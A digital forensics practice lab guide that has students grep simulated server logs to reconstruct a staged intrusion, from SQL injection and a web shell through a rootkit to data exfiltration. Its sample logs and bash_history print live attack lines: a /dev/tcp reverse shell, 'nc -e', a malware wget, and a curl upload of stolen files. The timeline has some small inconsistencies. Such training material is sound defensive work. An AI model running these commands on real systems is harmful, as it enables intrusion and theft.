# 🧪 Cywarx Forensics Lab — Practice Investigation Guide
#cywarx #digital-forensics #unit-iv #lab #practice

---

> [!abstract] 📌 Lab Scenario
> **Operation: Phantom Server**
> 
> You are a DFIR analyst. A server (`192.168.1.105`, hostname: `cywarx-server`) has been reported acting suspiciously — slow performance, unknown outbound connections observed by the network team at `03:00 AM`.
> 
> Your job: **Investigate all log files, identify every incident, and build a complete attack timeline.**
> 
> Logs are located at: `~/forensics-lab/var/log/`

---

> [!warning] ⚠️ Lab Rules
> - Always work on copies — never modify the originals
> - Hash everything before analysis
> - Document every finding with timestamp + source log
> - Build a timeline as you go

---

## 🔐 Step 0 — Setup & Hashing

```bash
# Navigate to lab directory
cd ~/forensics-lab/var/log/

# List all available log files
ls -lah
```

**Expected Output:**
```
total 196K
drwxr-xr-x 3 hexx hexx 4.0K Apr  1 10:00 .
drwxr-xr-x 4 hexx hexx 4.0K Apr  1 10:00 ..
drwxr-xr-x 2 hexx hexx 4.0K Apr  1 10:00 apache2
drwxr-xr-x 2 hexx hexx 4.0K Apr  1 10:00 mysql
-rw-r--r-- 1 hexx hexx  12K Apr  1 10:00 auth.log
-rw-r--r-- 1 hexx hexx   8K Apr  1 10:00 cron.log
-rw-r--r-- 1 hexx hexx   4K Apr  1 10:00 dpkg.log
-rw-r--r-- 1 hexx hexx   6K Apr  1 10:00 kern.log
-rw-r--r-- 1 hexx hexx   3K Apr  1 10:00 root_bash_history.txt
-rw-r--r-- 1 hexx hexx   5K Apr  1 10:00 syslog
-rw-r--r-- 1 hexx hexx   5K Apr  1 10:00 ufw.log
```

```bash
# Hash all logs for chain of custody
sha256sum auth.log syslog kern.log ufw.log cron.log dpkg.log \
  apache2/access.log apache2/error.log mysql/error.log \
  root_bash_history.txt > ~/forensics-lab/SHA256SUMS.txt

cat ~/forensics-lab/SHA256SUMS.txt
```

---

## 🔍 Step 1 — Investigate auth.log

### 1.1 — Count Failed Login Attempts Per IP

```bash
grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
```

**Expected Output:**
```
     68  185.220.101.5
      3  172.16.0.5
```

> [!danger] 🔴 Finding #1 — Brute Force Attack
> `185.220.101.5` made **68 failed login attempts** — SSH brute force confirmed.

---

### 1.2 — Did the Brute Force Succeed?

```bash
grep "Accepted password" auth.log
```

**Expected Output:**
```
Apr  1 02:47:13 cywarx-server sshd[2200]: Accepted password for admin from 185.220.101.5 port 56100 ssh2
Apr  1 02:50:00 cywarx-server sshd[2300]: Accepted password for backdoor from 185.220.101.5 port 57000 ssh2
```

> [!danger] 🔴 Finding #2 — Account Compromise
> Attacker successfully logged in as `admin` at `02:47:13` and later as `backdoor` at `02:50:00`.

---

### 1.3 — What Did the Attacker Do with sudo?

```bash
grep "sudo" auth.log | grep "COMMAND"
```

**Expected Output:**
```
Apr  1 02:47:20 cywarx-server sudo: admin : COMMAND=/usr/bin/id
Apr  1 02:48:00 cywarx-server sudo: admin : COMMAND=/usr/bin/cat /etc/shadow
Apr  1 02:48:30 cywarx-server sudo: admin : COMMAND=/usr/sbin/useradd -m -s /bin/bash backdoor
Apr  1 02:48:35 cywarx-server sudo: admin : COMMAND=/usr/sbin/usermod -aG sudo backdoor
Apr  1 02:48:40 cywarx-server sudo: admin : COMMAND=/bin/bash -c echo 'backdoor:Cywarx@2026!' | chpasswd
Apr  1 02:49:00 cywarx-server sudo: admin : COMMAND=/bin/chmod 777 /tmp
Apr  1 02:50:10 cywarx-server sudo: backdoor : COMMAND=/bin/bash
Apr  1 02:52:00 cywarx-server sudo: backdoor : COMMAND=/bin/cat /etc/shadow
Apr  1 03:15:00 cywarx-server sudo: backdoor : COMMAND=/usr/bin/apt install -y netcat-traditional nmap john hydra proxychains4
```

> [!danger] 🔴 Finding #3 — Privilege Escalation + Backdoor
> - Read `/etc/shadow` (credential dump)
> - Created backdoor user `backdoor`
> - Added `backdoor` to sudo group
> - Installed attacker toolkit

---

### 1.4 — Find New User Accounts Created

```bash
grep "new user\|useradd" auth.log
```

**Expected Output:**
```
Apr  1 02:48:33 cywarx-server useradd[3300]: new user: name=backdoor, UID=1005, GID=1005, home=/home/backdoor, shell=/bin/bash
```

> [!danger] 🔴 Finding #4 — Backdoor Account Created
> User `backdoor` (UID=1005) created at `02:48:33` — persistence mechanism.

---

### 1.5 — Check Full Session Duration of Attacker

```bash
grep "185.220.101.5" auth.log | grep -E "Accepted|closed"
```

**Expected Output:**
```
Apr  1 02:47:13 cywarx-server sshd[2200]: Accepted password for admin from 185.220.101.5 port 56100 ssh2
Apr  1 02:50:00 cywarx-server sshd[2300]: Accepted password for backdoor from 185.220.101.5 port 57000 ssh2
Apr  1 03:30:00 cywarx-server sshd[2200]: pam_unix(sshd:session): session closed for user admin
Apr  1 04:00:00 cywarx-server sshd[2300]: pam_unix(sshd:session): session closed for user backdoor
```

> [!warning] 🚨 Attacker was active for **~1 hour 43 minutes** (02:47 — 04:00)

---

## 🔍 Step 2 — Investigate syslog

### 2.1 — Find USB Device Insertion

```bash
grep -i "usb\|mass storage\|sd.*block" syslog
```

**Expected Output:**
```
Apr  1 01:45:22 cywarx-server kernel: [45322.300002] usb 1-1: Product: Ultra USB 3.0
Apr  1 01:45:22 cywarx-server kernel: [45322.300003] usb 1-1: Manufacturer: SanDisk
Apr  1 01:45:22 cywarx-server kernel: [45322.300004] usb 1-1: SerialNumber: AA01012700155035
Apr  1 01:45:22 cywarx-server kernel: [45322.400000] usb-storage 1-1:1.0: USB Mass Storage device detected
Apr  1 01:45:23 cywarx-server kernel: [45323.000000] sd 6:0:0:0: [sdb] 15728640 512-byte logical blocks: (8.05 GB/7.50 GiB)
Apr  1 01:52:10 cywarx-server kernel: [45730.000000] usb 1-1: USB disconnect, device number 3
```

> [!warning] 🚨 Finding #5 — USB Device Inserted
> SanDisk Ultra USB 3.0 (8GB, S/N: AA01012700155035) was inserted at `01:45:22` and removed at `01:52:10` — **7 minutes before brute force began.**

---

### 2.2 — Find Suspicious Process Killed by OOM

```bash
grep -i "out of memory\|oom_kill\|Killed process" syslog
```

**Expected Output:**
```
Apr  1 02:45:00 cywarx-server kernel: [55500.100000] Out of memory: Kill process 4422 (cryptominer64) score 952 or sacrifice child
Apr  1 02:45:00 cywarx-server kernel: [55500.200000] Killed process 4422 (cryptominer64) total-vm:2097152kB, anon-rss:1966080kB
Apr  1 02:45:01 cywarx-server kernel: [55501.000000] oom_reaper: reaped process 4422 (cryptominer64)
```

> [!danger] 🔴 Finding #6 — Cryptominer Running
> Process `cryptominer64` was consuming ~2GB RAM. Deployed during initial web shell compromise.

---

### 2.3 — Find Service Crashes

```bash
grep -i "segfault\|failed\|SEGV\|exited" syslog
```

**Expected Output:**
```
Apr  1 02:10:05 cywarx-server systemd[1]: apache2.service: Main process exited, code=killed, status=11/SEGV
Apr  1 02:10:05 cywarx-server systemd[1]: apache2.service: Failed with result 'signal'.
Apr  1 02:10:05 cywarx-server kernel: [52205.000000] apache2[2210]: segfault at 00007fff ip 00007fff7f3a2b10
```

---

## 🔍 Step 3 — Investigate kern.log

### 3.1 — Find Port Scan Evidence

```bash
grep "UFW BLOCK" kern.log | awk '{print $17}' | sort -t= -k2 -n | uniq
```

**Expected Output:**
```
DPT=21
DPT=23
DPT=25
DPT=80
DPT=110
DPT=443
DPT=1433
DPT=2049
DPT=3306
DPT=3389
DPT=4444
DPT=5432
DPT=5900
DPT=6379
DPT=8080
DPT=8443
DPT=9200
DPT=11211
DPT=27017
```

> [!warning] 🚨 Finding #7 — Port Scan Detected
> `185.220.101.5` scanned **19 ports** within 2 seconds — Nmap scan confirmed.

---

### 3.2 — Find Rootkit Module Loading

```bash
grep "module loaded\|insmod\|request_module" kern.log
```

**Expected Output:**
```
Apr  1 02:51:00 cywarx-server kernel: [56460.000000] request_module: module loaded: hide_procs
Apr  1 02:51:01 cywarx-server kernel: [56461.000000] request_module: module loaded: hide_files
Apr  1 02:51:02 cywarx-server kernel: [56462.000000] request_module: module loaded: net_backdoor
```

> [!danger] 🔴 Finding #8 — Rootkit Loaded
> Three non-standard kernel modules loaded at `02:51`: `hide_procs`, `hide_files`, `net_backdoor` — **rootkit installed**.

---

### 3.3 — Find Reverse Shell C2 Beaconing

```bash
grep "UFW ALLOW" kern.log | grep "DPT=4444"
```

**Expected Output:**
```
Apr  1 02:59:00 cywarx-server kernel: [57540.000000] [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444
Apr  1 03:00:01 cywarx-server kernel: [57601.000000] [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444
Apr  1 03:01:01 cywarx-server kernel: [57661.000000] [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444
Apr  1 03:02:01 cywarx-server kernel: [57721.000000] [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444
```

> [!danger] 🔴 Finding #9 — Active Reverse Shell / C2
> Server beaconing to `185.220.101.5:4444` every **60 seconds** — active C2 channel.

---

## 🔍 Step 4 — Investigate ufw.log

### 4.1 — Count Packets to Attacker IP

```bash
grep "185.220.101.5" ufw.log | awk '{print $6}' | sort | uniq -c
```

**Expected Output:**
```
     24  [UFW BLOCK]
     12  [UFW ALLOW]
```

### 4.2 — Find Data Exfiltration (High Volume Outbound)

```bash
grep "UFW ALLOW" ufw.log | grep "OUT=eth0" | grep "DPT=8888"
```

**Expected Output:**
```
Apr  1 03:20:00 cywarx-server kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=8888 ACK
Apr  1 03:20:01 cywarx-server kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=8888 ACK
Apr  1 03:20:02 cywarx-server kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=8888 ACK
Apr  1 03:20:03 cywarx-server kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=8888 ACK
Apr  1 03:20:04 cywarx-server kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=8888 ACK
...
```

> [!danger] 🔴 Finding #10 — Data Exfiltration
> Large data transfer to `185.220.101.5:8888` at `03:20` — matches cron data archive command.

---

## 🔍 Step 5 — Investigate Apache Logs

### 5.1 — Find Scanner User-Agents

```bash
grep -iE "sqlmap|nikto|dirbuster|masscan|nessus|acunetix" apache2/access.log | awk -F'"' '{print $6}' | sort | uniq -c
```

**Expected Output:**
```
      3  DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
      3  Nikto/2.1.6
      3  sqlmap/1.7.8#stable (https://sqlmap.org)
```

> [!warning] 🚨 Finding #11 — Active Scanners Detected
> Three different scanning tools used: **sqlmap, Nikto, DirBuster**.

---

### 5.2 — Find SQL Injection Attempts

```bash
grep -iE "union|select|sleep|information_schema|order+by" apache2/access.log | grep "185.220.101.5"
```

**Expected Output:**
```
185.220.101.5 - - [01/Apr/2026:02:10:05] "GET /login.php?id=1' HTTP/1.1" 500 0
185.220.101.5 - - [01/Apr/2026:02:10:10] "GET /login.php?id=1%20OR%201=1-- HTTP/1.1" 200 8192
185.220.101.5 - - [01/Apr/2026:02:10:20] "GET /login.php?id=1%20AND%20SLEEP(5) HTTP/1.1" 200 512
185.220.101.5 - - [01/Apr/2026:02:10:50] "GET /login.php?id=1%20UNION%20SELECT%20table_name..." 200 4096
185.220.101.5 - - [01/Apr/2026:02:11:10] "GET /login.php?id=1%20UNION%20SELECT%20username,password..." 200 1024
```

> [!danger] 🔴 Finding #12 — SQL Injection Successful
> SQLi attack progressed from error-based → boolean → time-based → UNION → **credential dump** (HTTP 200 on user extraction).

---

### 5.3 — Find LFI / Path Traversal

```bash
grep -iE "\.\./|etc/passwd|etc/shadow|proc/self" apache2/access.log
```

**Expected Output:**
```
185.220.101.5 - - [01/Apr/2026:02:20:10] "GET /download.php?file=../config.php HTTP/1.1" 200 340
185.220.101.5 - - [01/Apr/2026:02:20:15] "GET /download.php?file=../../etc/passwd HTTP/1.1" 200 1823
185.220.101.5 - - [01/Apr/2026:02:20:20] "GET /download.php?file=../../etc/shadow HTTP/1.1" 403 0
185.220.101.5 - - [01/Apr/2026:02:20:25] "GET /download.php?file=../../proc/self/environ HTTP/1.1" 200 512
185.220.101.5 - - [01/Apr/2026:02:20:30] "GET /download.php?file=../../var/log/auth.log HTTP/1.1" 200 14800
```

> [!danger] 🔴 Finding #13 — LFI Confirmed
> `config.php`, `/etc/passwd`, `proc/self/environ`, and even **`auth.log`** itself read by attacker.

---

### 5.4 — Find Web Shell Upload and Execution

```bash
grep "shell.php" apache2/access.log
```

**Expected Output:**
```
185.220.101.5 - - [01/Apr/2026:02:30:30] "GET /uploads/image001.jpg.php HTTP/1.1" 200 45
185.220.101.5 - - [01/Apr/2026:02:30:35] "GET /uploads/shell.php HTTP/1.1" 200 45
185.220.101.5 - - [01/Apr/2026:02:30:40] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 45
185.220.101.5 - - [01/Apr/2026:02:30:45] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 15
185.220.101.5 - - [01/Apr/2026:02:30:50] "GET /uploads/shell.php?cmd=uname+-a HTTP/1.1" 200 85
185.220.101.5 - - [01/Apr/2026:02:30:55] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1823
185.220.101.5 - - [01/Apr/2026:02:31:00] "GET /uploads/shell.php?cmd=cat+/etc/shadow HTTP/1.1" 200 892
185.220.101.5 - - [01/Apr/2026:02:31:20] "GET /uploads/shell.php?cmd=wget+http://185.220.101.5/malware.sh..." 200 55
```

> [!danger] 🔴 Finding #14 — Web Shell Full Compromise
> Shell uploaded → executed `id/whoami/uname` → read `/etc/passwd` + `/etc/shadow` → **downloaded malware**.

---

## 🔍 Step 6 — Investigate cron.log

### 6.1 — Find Reverse Shell in Cron

```bash
grep "CMD" cron.log | grep -v "run-parts\|apt"
```

**Expected Output:**
```
Apr  1 03:00:01 cywarx-server CRON[3700]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)
Apr  1 03:01:01 cywarx-server CRON[3702]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)
Apr  1 03:02:01 cywarx-server CRON[3703]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)
...
Apr  1 03:15:00 cywarx-server CRON[3720]: (root) CMD (tar czf /tmp/.data_archive.tar.gz /var/www/html/uploads/ /etc/passwd /home/ && curl -s -X POST -F "file=@/tmp/.data_archive.tar.gz" http://185.220.101.5:8888/upload)
```

> [!danger] 🔴 Finding #15 — Cron Persistence + Data Exfil
> - Reverse shell runs **every minute** via cron
> - At `03:15` — cron job archived `/home/`, `/etc/passwd`, `uploads/` and **POSTed to attacker server** port 8888

---

## 🔍 Step 7 — Investigate dpkg.log

### 7.1 — Find Attacker Tool Installations

```bash
grep "^2026-04-01 03:" dpkg.log | grep "install"
```

**Expected Output:**
```
2026-04-01 03:15:22 install netcat-traditional:amd64 <none> 1.10-47
2026-04-01 03:15:45 install nmap:amd64 <none> 7.80+dfsg1-2build1
2026-04-01 03:16:00 install john:amd64 <none> 1.9.0-jumbo-1+bleeding-amd64
2026-04-01 03:16:20 install hydra:amd64 <none> 9.0-1
2026-04-01 03:16:35 install proxychains4:amd64 <none> 4.14-1
2026-04-01 03:16:50 install socat:amd64 <none> 1.7.4.1-3
2026-04-01 03:17:00 install pspy64:amd64 <none> 1.2.0
2026-04-01 03:17:10 install tcpdump:amd64 <none> 4.99.1-3ubuntu0.1
```

> [!danger] 🔴 Finding #16 — Attacker Toolkit
> Post-compromise the attacker installed: **netcat, nmap, john (cracker), hydra (brute force), proxychains, socat, pspy64 (process spy), tcpdump** — full offensive kit.

---

## 🔍 Step 8 — Investigate MySQL Logs

### 8.1 — Find DB Brute Force + SQLi

```bash
grep "Access denied\|INTO OUTFILE\|LOAD_FILE\|information_schema\|dump" mysql/error.log
```

**Expected Output:**
```
2026-04-01T02:10:05.000000Z [Warning] Access denied for user 'root'@'185.220.101.5'
2026-04-01T02:10:06.000000Z [Warning] Access denied for user 'root'@'185.220.101.5'
2026-04-01T02:10:50.100000Z [Warning] Query produced an error — possible SQL injection: SELECT * FROM users WHERE id=1 UNION SELECT...
2026-04-01T02:11:12.000000Z [Note] Query: SELECT * INTO OUTFILE '/var/www/html/uploads/db_dump.txt' FROM users
2026-04-01T02:11:13.000000Z [Warning] INTO OUTFILE query executed — file written to webroot: /var/www/html/uploads/db_dump.txt
2026-04-01T02:20:00.000000Z [Note] Query: SELECT LOAD_FILE('/etc/passwd')
2026-04-01T02:20:00.500000Z [Warning] LOAD_FILE attempt on system file: /etc/passwd
```

> [!danger] 🔴 Finding #17 — DB Fully Compromised
> - DB brute forced (root attempted from external IP)
> - Full user table dumped to webroot (`db_dump.txt` — downloadable!)
> - `LOAD_FILE` used to read `/etc/passwd` via SQL

---

## 🔍 Step 9 — Recover Attacker Commands

### 9.1 — Read Attacker's bash_history

```bash
cat root_bash_history.txt
```

**Expected Output:**
```bash
id
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
find / -perm -4000 -type f 2>/dev/null
mysql -u root -p
wget http://185.220.101.5/malware.sh -O /tmp/.update.sh
chmod +x /tmp/.update.sh
useradd -m -s /bin/bash backdoor
echo 'backdoor:Cywarx@2026!' | chpasswd
usermod -aG sudo backdoor
echo "* * * * * root bash -i >& /dev/tcp/185.220.101.5/4444 0>&1" >> /etc/crontab
mkdir -p /tmp/.hidden_dir
cp /bin/bash /tmp/.hidden_dir/.bash_copy
chmod +s /tmp/.hidden_dir/.bash_copy
tar czf /tmp/.data_archive.tar.gz /var/www/html/uploads/ /etc/passwd /home/
curl -s -X POST -F "file=@/tmp/.data_archive.tar.gz" http://185.220.101.5:8888/upload
insmod /tmp/hide_procs.ko
insmod /tmp/hide_files.ko
nc -e /bin/bash 185.220.101.5 4444
history -c
```

> [!danger] 🔴 Finding #18 — SUID Backdoor
> Attacker copied `/bin/bash` to `/tmp/.hidden_dir/.bash_copy` and set **SUID bit** — hidden root shell.

---

## 📋 Step 10 — Build the Full Attack Timeline

```bash
# Merge all logs sorted by time (filter suspicious window 01:30 - 04:00)
grep -h "Apr  1 0[1-4]:" auth.log syslog kern.log ufw.log cron.log \
  | sort -k1,3 > ~/forensics-lab/FULL_TIMELINE.txt

wc -l ~/forensics-lab/FULL_TIMELINE.txt
head -50 ~/forensics-lab/FULL_TIMELINE.txt
```

---

### ✅ Complete Attack Timeline — Reconstructed

```
┌──────────┬──────────────────────────────────────────────────────────────────┬──────────────────┐
│ TIME     │ INCIDENT                                                         │ SOURCE           │
├──────────┼──────────────────────────────────────────────────────────────────┼──────────────────┤
│ 01:45:22 │ SanDisk USB 8GB inserted (S/N: AA01012700155035)                 │ syslog           │
│ 01:52:10 │ USB disconnected after 7 minutes                                 │ syslog           │
│ 02:00:01 │ Port scan: 19 ports in <2 sec from 185.220.101.5                 │ kern.log         │
│ 02:00:12 │ sqlmap scanner detected against login.php                        │ apache/access    │
│ 02:00:20 │ Nikto web scanner detected                                       │ apache/access    │
│ 02:00:35 │ DirBuster directory bruteforce detected                          │ apache/access    │
│ 02:00:26 │ .git/config exposed — HTTP 200 (sensitive!)                      │ apache/access    │
│ 02:00:30 │ config.php.bak exposed — HTTP 200 (credentials!)                 │ apache/access    │
│ 02:10:05 │ SQL injection: error-based (500 response on quote)               │ apache/access    │
│ 02:10:10 │ SQLi: OR 1=1 bypass — HTTP 200 (8192 bytes = full dump)          │ apache/access    │
│ 02:10:20 │ SQLi: time-based (SLEEP(5))                                      │ apache/access    │
│ 02:10:50 │ SQLi: UNION-based — dumped table names                           │ apache/access    │
│ 02:11:10 │ SQLi: extracted username+password from users table               │ apache/access    │
│ 02:11:12 │ DB: INTO OUTFILE → db_dump.txt written to webroot                │ mysql/error      │
│ 02:20:15 │ LFI: /etc/passwd read successfully (HTTP 200, 1823 bytes)        │ apache/access    │
│ 02:20:25 │ LFI: /proc/self/environ read (environment variables leaked)      │ apache/access    │
│ 02:20:30 │ LFI: auth.log itself read by attacker                            │ apache/access    │
│ 02:30:10 │ Web shell (shell.php) uploaded via POST to /uploads/             │ apache/access    │
│ 02:30:40 │ Web shell executed: id, whoami, uname -a                         │ apache/access    │
│ 02:30:55 │ Web shell: cat /etc/passwd (1823 bytes returned)                 │ apache/access    │
│ 02:31:00 │ Web shell: cat /etc/shadow (892 bytes — hashed passwords!)       │ apache/access    │
│ 02:31:20 │ Web shell: wget malware.sh from attacker, chmod +x, executed     │ apache/access    │
│ 02:45:00 │ Cryptominer (cryptominer64) killed by OOM — consuming 2GB RAM    │ syslog           │
│ 02:47:13 │ SSH brute force SUCCESS — admin account compromised              │ auth.log         │
│ 02:48:00 │ sudo: admin read /etc/shadow (credential dump)                   │ auth.log         │
│ 02:48:33 │ Backdoor user created (UID=1005, sudo group)                     │ auth.log         │
│ 02:50:00 │ Backdoor user SSH login from 185.220.101.5                       │ auth.log         │
│ 02:51:00 │ Rootkit modules loaded: hide_procs, hide_files, net_backdoor     │ kern.log         │
│ 02:55:10 │ Network interface entered promiscuous mode (sniffing!)           │ syslog           │
│ 02:59:00 │ First reverse shell beacon → 185.220.101.5:4444                  │ kern.log         │
│ 03:00:01 │ Cron reverse shell begins — every 60 seconds                     │ cron.log         │
│ 03:15:00 │ Attacker installed: nmap, netcat, john, hydra, proxychains       │ dpkg.log         │
│ 03:15:00 │ Cron data exfil: archived /etc/passwd + /home + uploads          │ cron.log         │
│ 03:20:00 │ Data uploaded to attacker server port 8888 (confirmed exfil)     │ ufw.log          │
│ 03:30:00 │ admin SSH session closed                                         │ auth.log         │
│ 04:00:00 │ backdoor SSH session closed                                      │ auth.log         │
└──────────┴──────────────────────────────────────────────────────────────────┴──────────────────┘
```

---

## 🏁 Summary — All Incidents Found

| # | Incident | Severity | First Seen |
|---|----------|----------|------------|
| 1 | SSH Brute Force | 🟡 Medium | 02:00:01 |
| 2 | Account Compromise (admin) | 🔴 Critical | 02:47:13 |
| 3 | Privilege Escalation via sudo | 🔴 Critical | 02:48:00 |
| 4 | Backdoor Account Created | 🔴 Critical | 02:48:33 |
| 5 | USB Device Inserted | 🟡 Medium | 01:45:22 |
| 6 | Cryptominer Deployed | 🔴 Critical | 02:45:00 |
| 7 | Port Scan (19 ports) | 🟡 Medium | 02:00:01 |
| 8 | Rootkit Loaded (3 modules) | 🔴 Critical | 02:51:00 |
| 9 | Active Reverse Shell C2 | 🔴 Critical | 02:59:00 |
| 10 | Data Exfiltration (port 8888) | 🔴 Critical | 03:20:00 |
| 11 | Web Scanners (sqlmap/Nikto) | 🟡 Medium | 02:00:12 |
| 12 | SQL Injection — User Dump | 🔴 Critical | 02:10:05 |
| 13 | LFI — /etc/passwd Read | 🔴 Critical | 02:20:15 |
| 14 | Web Shell Upload + RCE | 🔴 Critical | 02:30:10 |
| 15 | Cron Persistence | 🔴 Critical | 03:00:01 |
| 16 | Attacker Toolkit Installed | 🔴 Critical | 03:15:22 |
| 17 | Database Fully Compromised | 🔴 Critical | 02:10:50 |
| 18 | SUID Backdoor Planted | 🔴 Critical | 02:51 (bash_history) |

---

> [!success] ✅ Investigation Complete
> **18 incidents** identified across 9 log files. Complete attack chain reconstructed from initial recon (port scan) through persistence (rootkit + cron + SUID backdoor) to data exfiltration.

---

*Cywarx — Unit IV: Digital Forensics | Practice Lab*
*Scenario: Operation Phantom Server | Author: HeXx*
